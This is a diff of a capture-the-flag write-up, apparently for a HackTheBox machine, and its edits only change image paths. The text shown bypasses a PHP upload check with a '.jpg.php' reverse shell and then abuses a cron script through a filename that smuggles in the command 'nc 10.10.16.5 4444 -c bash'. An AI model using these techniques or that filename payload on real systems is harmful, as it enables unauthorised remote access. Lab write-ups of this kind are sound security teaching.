@@ -14,7 +14,7 @@ First, we can use `gobuster` on the website:
 
 The `/backup` directory would show us a directory with a backup file:
 
-<figure><img src="../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (164) (1).png" alt=""><figcaption></figcaption></figure>
 
 Within the backup file, there's this PHP code here:
 
@@ -74,13 +74,13 @@ if( isset($_POST['submit']) ) {
 
 In short, we can see that this file checks for the file extensions before accepting a file. Seeing that this is a PHP file, we can attempt to upload a PHP reverse shell. To bypass the extension check, notice how it uses `substr_compare` and verifies whether a valid extension is present. As such, we can create a file ending in `.jpg.php` to bypass this:
 
-<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (77) (2).png" alt=""><figcaption></figcaption></figure>
 
 Then, we can upload it to `upload.php`. We can visit `photos.php` to trigger the shell:
 
 <figure><img src="../../../.gitbook/assets/image (4) (1) (5).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (168) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -88,11 +88,11 @@ Then, we can upload it to `upload.php`. We can visit `photos.php` to trigger the
 
 Within the machine, we can view the user `guly` directory:
 
-<figure><img src="../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (154) (4).png" alt=""><figcaption></figcaption></figure>
 
 The crontab specifies that the user is running the `check_attack` script routinely.
 
-<figure><img src="../../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (169) (2).png" alt=""><figcaption></figcaption></figure>
 
 One dangerous part of this script is the usage of `exec` to run stuff. The `$value` variable is not sanitised, and we can exploit this by creating a file with the name of `; nc 10.10.16.5 4444 -c bash` within the `/var/www/html/uploads` directory. After doing this and waiting, we would gain a reverse shell and can capture the user flag:
 
